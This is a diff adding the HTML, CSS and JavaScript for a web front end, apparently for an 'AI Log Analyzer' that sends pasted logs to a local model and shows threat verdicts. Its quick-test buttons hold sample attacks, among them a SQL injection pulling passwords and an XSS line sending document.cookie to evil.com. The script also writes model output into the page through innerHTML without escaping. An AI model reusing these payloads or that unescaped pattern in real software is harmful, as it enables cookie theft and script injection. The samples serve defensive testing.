@@ -1,0 +1,1106 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Log Analyzer | Cybersecurity Threat Detection</title>
+    <meta name="description" content="AI-powered log analysis for detecting cybersecurity threats">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #111118;
+            --bg-card: #16161e;
+            --bg-input: #1a1a24;
+            --bg-hover: #1e1e2a;
+            --text-primary: #f0f0f5;
+            --text-secondary: #a0a0b0;
+            --text-muted: #606070;
+            --accent: #7c3aed;
+            --accent-hover: #8b5cf6;
+            --accent-glow: rgba(124, 58, 237, 0.4);
+            --border: rgba(255, 255, 255, 0.08);
+            --border-hover: rgba(255, 255, 255, 0.15);
+            --success: #10b981;
+            --success-bg: rgba(16, 185, 129, 0.1);
+            --warning: #f59e0b;
+            --warning-bg: rgba(245, 158, 11, 0.1);
+            --danger: #ef4444;
+            --danger-bg: rgba(239, 68, 68, 0.1);
+            --critical: #dc2626;
+            --critical-bg: rgba(220, 38, 38, 0.15);
+            --info: #3b82f6;
+            --info-bg: rgba(59, 130, 246, 0.1);
+            --radius: 12px;
+            --radius-sm: 8px;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 720px;
+        }
+
+        /* Header */
+        header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, var(--accent), #06b6d4);
+            border-radius: var(--radius);
+            margin-bottom: 1rem;
+            box-shadow: 0 8px 32px var(--accent-glow);
+        }
+
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            color: white;
+        }
+
+        h1 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin-bottom: 0.35rem;
+            letter-spacing: -0.02em;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        /* Cards */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+        }
+
+        /* Form */
+        .form-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.6rem;
+        }
+
+        label {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .char-count {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        textarea {
+            width: 100%;
+            height: 140px;
+            padding: 1rem;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            resize: vertical;
+            transition: all 0.2s ease;
+            margin-bottom: 1rem;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        textarea::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Quick Tests */
+        .quick-tests {
+            margin-bottom: 1rem;
+        }
+
+        .quick-tests-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .quick-btns {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .quick-btn {
+            padding: 0.4rem 0.75rem;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.35rem;
+        }
+
+        .quick-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+            color: var(--text-primary);
+        }
+
+        /* Buttons */
+        .btn-row {
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 0.85rem 1.25rem;
+            background: linear-gradient(135deg, var(--accent), #9333ea);
+            border: none;
+            border-radius: var(--radius-sm);
+            color: white;
+            font-family: inherit;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px var(--accent-glow);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .btn-secondary {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            flex: 0 0 auto;
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+            box-shadow: none;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Thinking Panel */
+        .thinking-panel {
+            display: none;
+            margin-bottom: 1rem;
+        }
+
+        .thinking-panel.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .thinking-header {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .thinking-header svg {
+            width: 18px;
+            height: 18px;
+            color: var(--accent);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .thinking-title {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .thinking-content {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            line-height: 1.5;
+        }
+
+        .thinking-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: var(--accent);
+            margin-left: 2px;
+            animation: blink 0.7s infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            50% {
+                opacity: 1;
+            }
+
+            51%,
+            100% {
+                opacity: 0;
+            }
+        }
+
+        /* Results */
+        .results {
+            display: none;
+        }
+
+        .results.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Alert Banner */
+        .alert-banner {
+            display: none;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.85rem 1rem;
+            border-radius: var(--radius-sm);
+            margin-bottom: 1rem;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .alert-banner.show {
+            display: flex;
+        }
+
+        .alert-banner.danger {
+            background: var(--danger-bg);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: var(--danger);
+        }
+
+        .alert-banner.success {
+            background: var(--success-bg);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: var(--success);
+        }
+
+        .alert-banner svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+        }
+
+        /* Results Header */
+        .results-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            padding-bottom: 0.85rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .results-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+        }
+
+        .results-actions {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .icon-btn {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: all 0.15s ease;
+        }
+
+        .icon-btn:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+            border-color: var(--border-hover);
+        }
+
+        .icon-btn svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Stats Row */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+        }
+
+        .stat-item {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 0.85rem;
+            text-align: center;
+        }
+
+        .stat-label {
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.35rem;
+        }
+
+        .stat-value {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        /* Severity Badge */
+        .severity-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.25rem 0.6rem;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .severity-badge.low {
+            background: var(--success-bg);
+            color: var(--success);
+        }
+
+        .severity-badge.medium {
+            background: var(--warning-bg);
+            color: var(--warning);
+        }
+
+        .severity-badge.high {
+            background: var(--danger-bg);
+            color: var(--danger);
+        }
+
+        .severity-badge.critical {
+            background: var(--critical-bg);
+            color: var(--critical);
+            animation: pulse 2s infinite;
+        }
+
+        .severity-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+        }
+
+        /* Detail Cards */
+        .detail-grid {
+            display: grid;
+            gap: 0.75rem;
+        }
+
+        .detail-card {
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            padding: 1rem;
+        }
+
+        .detail-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.4rem;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .detail-label svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .detail-text {
+            font-size: 0.9rem;
+            color: var(--text-primary);
+            line-height: 1.6;
+        }
+
+        /* Tags */
+        .tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+
+        .tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+            padding: 0.3rem 0.6rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--text-secondary);
+        }
+
+        .tag.ip {
+            border-color: rgba(245, 158, 11, 0.3);
+            color: var(--warning);
+        }
+
+        .tag.indicator {
+            border-color: rgba(239, 68, 68, 0.3);
+            color: var(--danger);
+        }
+
+        .tag svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding-top: 0.5rem;
+        }
+
+        .footer-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 1.5rem;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .status-line {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--text-muted);
+        }
+
+        .status-dot.online {
+            background: var(--success);
+            box-shadow: 0 0 8px rgba(16, 185, 129, 0.5);
+        }
+
+        .status-dot.offline {
+            background: var(--danger);
+        }
+
+        .kbd {
+            padding: 0.15rem 0.4rem;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            padding: 0.75rem 1.25rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 0.85rem;
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            body {
+                padding: 1rem;
+            }
+
+            .stats-row {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .quick-btns {
+                justify-content: center;
+            }
+
+            .btn-row {
+                flex-direction: column;
+            }
+
+            .footer-row {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-hover);
+            border-radius: 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <main class="container">
+        <header>
+            <div class="logo">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                </svg>
+            </div>
+            <h1>AI Log Analyzer</h1>
+            <p class="subtitle">Detect threats in your log entries with AI</p>
+        </header>
+
+        <section class="card">
+            <div class="form-header">
+                <label for="logInput">Log Entry</label>
+                <span class="char-count"><span id="charCount">0</span> / 5000</span>
+            </div>
+            <textarea id="logInput" maxlength="5000" placeholder="Paste your log entry here for analysis..."></textarea>
+
+            <div class="quick-tests">
+                <span class="quick-tests-label">Quick Tests:</span>
+                <div class="quick-btns">
+                    <button class="quick-btn"
+                        data-log="ERROR: Multiple failed login attempts from 192.168.1.100 for user 'admin' - Account locked">
+                        🔐 Brute Force
+                    </button>
+                    <button class="quick-btn"
+                        data-log="GET /api/users?id=1' UNION SELECT username,password FROM users--">
+                        💉 SQL Injection
+                    </button>
+                    <button class="quick-btn"
+                        data-log="<script>fetch('http://evil.com/steal?c='+document.cookie)</script>">
+                        ⚡ XSS Attack
+                    </button>
+                    <button class="quick-btn"
+                        data-log="WARN: Outbound traffic spike - 500MB sent to 203.0.113.50 in 5 minutes">
+                        📡 Data Exfil
+                    </button>
+                    <button class="quick-btn" data-log="INFO: User john.doe logged in successfully from 10.0.0.25">
+                        ✅ Normal Log
+                    </button>
+                </div>
+            </div>
+
+            <div class="btn-row">
+                <button class="btn" id="analyzeBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="11" cy="11" r="8" />
+                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                    </svg>
+                    <span id="btnText">Analyze Log</span>
+                </button>
+                <button class="btn btn-secondary" id="clearBtn" title="Clear">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2" />
+                    </svg>
+                </button>
+            </div>
+        </section>
+
+        <!-- Thinking Panel -->
+        <section class="card thinking-panel" id="thinkingPanel">
+            <div class="thinking-header">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="M12 6v6l4 2" />
+                </svg>
+                <span class="thinking-title">🧠 AI Thinking Process</span>
+            </div>
+            <div class="thinking-content" id="thinkingContent"><span class="thinking-cursor"></span></div>
+        </section>
+
+        <section class="card results" id="results">
+            <div class="alert-banner" id="alertBanner">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
+                    <line x1="12" y1="9" x2="12" y2="13" />
+                    <line x1="12" y1="17" x2="12.01" y2="17" />
+                </svg>
+                <span id="alertText">Suspicious activity detected!</span>
+            </div>
+
+            <div class="results-header">
+                <span class="results-title">Analysis Results</span>
+                <div class="results-actions">
+                    <button class="icon-btn" id="copyBtn" title="Copy results">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="9" y="9" width="13" height="13" rx="2" />
+                            <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" />
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <div class="stats-row">
+                <div class="stat-item">
+                    <div class="stat-label">Status</div>
+                    <div class="stat-value" id="suspiciousStatus">—</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Severity</div>
+                    <div class="stat-value"><span class="severity-badge" id="severityBadge"><span
+                                class="severity-dot"></span> —</span></div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Confidence</div>
+                    <div class="stat-value" id="confidence">—</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Type</div>
+                    <div class="stat-value" id="attackType">—</div>
+                </div>
+            </div>
+
+            <div class="detail-grid">
+                <div class="detail-card">
+                    <div class="detail-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <path d="M12 16v-4M12 8h.01" />
+                        </svg>
+                        Explanation
+                    </div>
+                    <p class="detail-text" id="explanation">—</p>
+                </div>
+
+                <div class="detail-card">
+                    <div class="detail-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                        </svg>
+                        Recommendation
+                    </div>
+                    <p class="detail-text" id="recommendation">—</p>
+                </div>
+
+                <div class="detail-card" id="indicatorsCard" style="display: none;">
+                    <div class="detail-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path
+                                d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
+                        </svg>
+                        Threat Indicators
+                    </div>
+                    <div class="tags" id="indicators"></div>
+                </div>
+
+                <div class="detail-card" id="ipsCard" style="display: none;">
+                    <div class="detail-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="2" y="3" width="20" height="14" rx="2" />
+                            <line x1="8" y1="21" x2="16" y2="21" />
+                            <line x1="12" y1="17" x2="12" y2="21" />
+                        </svg>
+                        Extracted IPs
+                    </div>
+                    <div class="tags" id="extractedIPs"></div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <div class="footer-row">
+                <div class="status-line">
+                    <span class="status-dot" id="statusDot"></span>
+                    <span id="statusText">Checking...</span>
+                </div>
+                <span><kbd class="kbd">Ctrl</kbd> + <kbd class="kbd">Enter</kbd> to analyze</span>
+            </div>
+        </footer>
+    </main>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // Elements
+        const logInput = document.getElementById('logInput');
+        const analyzeBtn = document.getElementById('analyzeBtn');
+        const btnText = document.getElementById('btnText');
+        const clearBtn = document.getElementById('clearBtn');
+        const charCount = document.getElementById('charCount');
+        const thinkingPanel = document.getElementById('thinkingPanel');
+        const thinkingContent = document.getElementById('thinkingContent');
+        const results = document.getElementById('results');
+        const toast = document.getElementById('toast');
+
+        // Result elements
+        const alertBanner = document.getElementById('alertBanner');
+        const alertText = document.getElementById('alertText');
+        const suspiciousStatus = document.getElementById('suspiciousStatus');
+        const severityBadge = document.getElementById('severityBadge');
+        const confidence = document.getElementById('confidence');
+        const attackType = document.getElementById('attackType');
+        const explanation = document.getElementById('explanation');
+        const recommendation = document.getElementById('recommendation');
+        const indicatorsCard = document.getElementById('indicatorsCard');
+        const indicators = document.getElementById('indicators');
+        const ipsCard = document.getElementById('ipsCard');
+        const extractedIPs = document.getElementById('extractedIPs');
+
+        let lastResult = null;
+
+        // Check API health
+        async function checkHealth() {
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
+            try {
+                const res = await fetch('/api/health');
+                const data = await res.json();
+                if (data.ollama?.available) {
+                    statusDot.classList.add('online');
+                    statusText.textContent = `${data.model || 'AI'} connected`;
+                } else {
+                    statusDot.classList.add('offline');
+                    statusText.textContent = 'AI offline';
+                }
+            } catch (e) {
+                statusDot.classList.add('offline');
+                statusText.textContent = 'Server offline';
+            }
+        }
+
+        // Show toast
+        function showToast(message) {
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        // Analyze log with streaming
+        async function analyzeLog() {
+            const log = logInput.value.trim();
+            if (!log) {
+                showToast('Please enter a log entry');
+                return;
+            }
+
+            // Reset UI
+            analyzeBtn.disabled = true;
+            btnText.innerHTML = '<span class="spinner"></span> Analyzing...';
+            results.classList.remove('show');
+            thinkingPanel.classList.add('show');
+            thinkingContent.innerHTML = '<span class="thinking-cursor"></span>';
+
+            try {
+                const response = await fetch('/api/analyze-stream', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ log })
+                });
+
+                const reader = response.body.getReader();
+                const decoder = new TextDecoder();
+                let thinkingText = '';
+
+                while (true) {
+                    const { done, value } = await reader.read();
+                    if (done) break;
+
+                    const chunk = decoder.decode(value);
+                    const lines = chunk.split('\n');
+
+                    for (const line of lines) {
+                        if (line.startsWith('data: ')) {
+                            try {
+                                const data = JSON.parse(line.slice(6));
+
+                                if (data.type === 'thinking') {
+                                    thinkingText += data.content;
+                                    thinkingContent.innerHTML = thinkingText + '<span class="thinking-cursor"></span>';
+                                    thinkingContent.scrollTop = thinkingContent.scrollHeight;
+                                } else if (data.type === 'complete') {
+                                    lastResult = data.result;
+                                    thinkingContent.innerHTML = thinkingText; // Remove cursor
+                                    displayResults(data.result);
+                                } else if (data.type === 'error') {
+                                    showToast('Error: ' + data.error);
+                                    thinkingPanel.classList.remove('show');
+                                }
+                            } catch (e) {
+                                // Skip invalid JSON
+                            }
+                        }
+                    }
+                }
+
+            } catch (e) {
+                showToast('Failed to connect to server');
+                thinkingPanel.classList.remove('show');
+            } finally {
+                analyzeBtn.disabled = false;
+                btnText.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg> Analyze Log`;
+            }
+        }
+
+        // Display results
+        function displayResults(data) {
+            results.classList.add('show');
+
+            // Alert banner
+            if (data.isSuspicious) {
+                alertBanner.className = 'alert-banner show danger';
+                alertText.textContent = 'Suspicious activity detected! Immediate action recommended.';
+            } else {
+                alertBanner.className = 'alert-banner show success';
+                alertText.textContent = 'No immediate threats detected.';
+            }
+
+            // Status
+            suspiciousStatus.textContent = data.isSuspicious ? '⚠️ Suspicious' : '✓ Safe';
+            suspiciousStatus.style.color = data.isSuspicious ? 'var(--danger)' : 'var(--success)';
+
+            // Severity
+            const sev = (data.risk || 'low').toLowerCase();
+            severityBadge.className = 'severity-badge ' + sev;
+            severityBadge.innerHTML = `<span class="severity-dot"></span> ${sev.toUpperCase()}`;
+
+            // Confidence
+            const conf = data.confidence !== undefined ? (data.confidence * 100).toFixed(0) : 85;
+            confidence.textContent = conf + '%';
+
+            // Type
+            attackType.textContent = data.type || 'Unknown';
+
+            // Explanation & Recommendation
+            explanation.textContent = data.explanation || 'No details available';
+            recommendation.textContent = data.suggestion || 'No recommendations';
+
+            // Indicators
+            if (data.indicators && data.indicators.length > 0) {
+                indicatorsCard.style.display = 'block';
+                indicators.innerHTML = data.indicators.map(i =>
+                    `<span class="tag indicator"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/></svg>${i}</span>`
+                ).join('');
+            } else {
+                indicatorsCard.style.display = 'none';
+            }
+
+            // IPs
+            if (data.extractedIPs && data.extractedIPs.length > 0) {
+                ipsCard.style.display = 'block';
+                extractedIPs.innerHTML = data.extractedIPs.map(ip =>
+                    `<span class="tag ip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/></svg>${ip}</span>`
+                ).join('');
+            } else {
+                ipsCard.style.display = 'none';
+            }
+
+            results.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        }
+
+        // Copy results
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            if (!lastResult) return;
+            const text = `AI Log Analysis Results
+━━━━━━━━━━━━━━━━━━━━━━
+Status: ${lastResult.isSuspicious ? 'Suspicious' : 'Safe'}
+Type: ${lastResult.type}
+Severity: ${lastResult.risk}
+Confidence: ${(lastResult.confidence * 100).toFixed(0)}%
+
+Explanation:
+${lastResult.explanation}
+
+Recommendation:
+${lastResult.suggestion}
+
+Indicators: ${lastResult.indicators?.join(', ') || 'None'}
+IPs: ${lastResult.extractedIPs?.join(', ') || 'None'}`;
+
+            navigator.clipboard.writeText(text).then(() => showToast('Results copied!'));
+        });
+
+        // Clear
+        clearBtn.addEventListener('click', () => {
+            logInput.value = '';
+            charCount.textContent = '0';
+            results.classList.remove('show');
+            thinkingPanel.classList.remove('show');
+            lastResult = null;
+        });
+
+        // Character count
+        logInput.addEventListener('input', () => {
+            charCount.textContent = logInput.value.length;
+        });
+
+        // Keyboard shortcut
+        logInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && e.ctrlKey) {
+                analyzeLog();
+            }
+        });
+
+        // Analyze button
+        analyzeBtn.addEventListener('click', analyzeLog);
+
+        // Quick test buttons
+        document.querySelectorAll('.quick-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                logInput.value = btn.dataset.log;
+                charCount.textContent = logInput.value.length;
+                analyzeLog();
+            });
+        });
+
+        // Init
+        checkHealth();
+    </script>
+</body>
+
+</html>
